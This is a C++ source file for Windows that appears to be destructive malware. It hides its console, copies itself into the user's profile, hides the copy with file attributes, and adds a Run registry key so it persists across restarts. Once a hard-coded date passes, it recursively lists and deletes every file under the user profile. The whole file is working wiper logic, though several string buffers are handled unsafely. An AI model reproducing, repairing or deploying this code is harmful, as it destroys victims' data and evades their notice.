#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <string>
#include <iostream>
#include <Lmcons.h>
#include <ctime>
#include <fstream>
#include <vector>
#define TOTAL_BYTES_READ    1024
#define OFFSET_BYTES 1024

using namespace std;

string exec(string command) {
   char buffer[1000];
   int i = 0;
   string* result = new string;
   string tempo = "";

   FILE* pipe = popen(command.c_str(), "r");
   if (!pipe) {
      return "popen failed!";
   }
   
   while (!feof(pipe)) {
      
      if (fgets(buffer, 1000, pipe) != NULL)
         tempo += buffer;
    
        i++;
   }

   pclose(pipe);
   return tempo;
}

void HideConsole()
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

void separate(string pathList, vector<string> *v){
	int i = 0;
	while (i < pathList.length()){
    	string temp = "";
	    while(pathList[i]!='\n'){
	    	temp += pathList[i];
	    	i++;
		}
		v->push_back(temp);
		i++;
	}
	
}


int getPass(){
    char username[UNLEN+1];
    DWORD username_len = UNLEN+1;
    GetUserName(username, &username_len);
    return strcmp(username,"username");
}


BOOL writeStringInRegistry(HKEY hKeyParent, LPCSTR subkey, LPCSTR valueName, LPCSTR strData)
{
    DWORD Ret;
    HKEY hKey;
    
    //Check if the registry exists
    Ret = RegOpenKeyEx(hKeyParent,subkey,0,KEY_WRITE,&hKey);
    if (Ret == ERROR_SUCCESS)
    {
        if (ERROR_SUCCESS != RegSetValueEx(hKey,valueName,0,REG_SZ,(LPBYTE)(strData),((((DWORD)lstrlen(strData) + 1)) * 2)))
        {
            RegCloseKey(hKey);
            return FALSE;
        }
        RegCloseKey(hKey);
        return TRUE;
    }
    return FALSE;
}



BOOL readStringFromRegistry(HKEY hKeyParent, LPCSTR subkey, LPCSTR valueName/*, LPCSTR *readData*/)
{
    HKEY hKey;
    DWORD len = TOTAL_BYTES_READ;
    DWORD readDataLen = len;
    PWCHAR readBuffer = (PWCHAR )malloc(sizeof(PWCHAR)* len);
    if (readBuffer == NULL)
        return FALSE;
    //Check if the registry exists
    DWORD Ret = RegOpenKeyEx(hKeyParent,subkey,0,KEY_READ,&hKey);
    if (Ret == ERROR_SUCCESS)
    {
        Ret = RegQueryValueEx(hKey,valueName,NULL,NULL,(BYTE*)readBuffer,&readDataLen);
        /*while (Ret == ERROR_MORE_DATA)
        {
            // Get a buffer that is big enough.
            len += OFFSET_BYTES;
            readBuffer = (PWCHAR)realloc(readBuffer, len);
            readDataLen = len;
            Ret = RegQueryValueEx(hKey,valueName,NULL,NULL,(BYTE*)readBuffer,&readDataLen);
        }*/
        if (Ret != ERROR_SUCCESS)
        {
            RegCloseKey(hKey);
            return false;
        }
        //*readData = readBuffer;
        RegCloseKey(hKey);
        return true;
    }
    else
    {
        return false;
    }
}

int getCDate(){
	time_t now = time(0);
	tm *ltm = localtime(&now);
	int year = ltm->tm_year + 1900;
	int month = ltm->tm_mon + 1;
	int day = ltm->tm_mday;
	return ((year*10000)+(month*100)+day);
}

void createFile(const char* path, int strore){
	fstream HFile;
	HFile.open(path,ios::out);
	HFile << strore << endl;
	HFile.close();
	char* s = new char;
	strcpy(s,"attrib +s +h ");
	strcat(s,path);
	system(s);
}

void hideFile(char* path){
	char* s;
	strcpy(s,"attrib +s +h ");
	strcat(s,path);
	system(s);
}

string ExePath() {
    char buffer[MAX_PATH];
    GetModuleFileName( NULL, buffer, MAX_PATH );
    string::size_type pos = string( buffer ).find_last_of( "\\/" );
    return string( buffer ).substr( 0, pos);
}

void lauchPayload(){
	string p = ExePath();
	if (!p.compare(getenv("USERPROFILE"))){

	while (getCDate() < 20200428){
		Sleep(5000);
		cout << "hello";
	}
		
		string user = getenv("USERPROFILE");
		string cmd = "dir " + user + " /s /b /o:gn";
	    string res = exec(cmd);
	    vector<string> list;
	    separate(res,&list);
	    
	    for (int i = 0;i<list.size();i++){
	    	const char* l = list[i].c_str();
	    	remove(l);
	    }
	}

	else exit(0);
}

void createPayload(){
	if (getPass()){
        bool exist = readStringFromRegistry(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run","Message");
        if (exist){
            lauchPayload();
        }
        else
        {
            char* cmd;
            strcpy(cmd,"copy a.exe ");
            strcat(cmd,getenv("USERPROFILE"));
            system(cmd);
            strcpy(cmd,getenv("USERPROFILE"));
            strcat(cmd,"\\a.exe /background");
            bool stats = writeStringInRegistry(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run","Message",cmd);
        }
    }
}






int main(){
	HideConsole();
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	ZeroMemory( &pi, sizeof(pi) );
	createPayload();
	char* s = new char;
	strcpy(s,getenv("USERPROFILE"));
	strcat(s,"\\a.exe");
	hideFile(s);
	CreateProcess(TEXT(s),NULL,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi);
    return 0;
}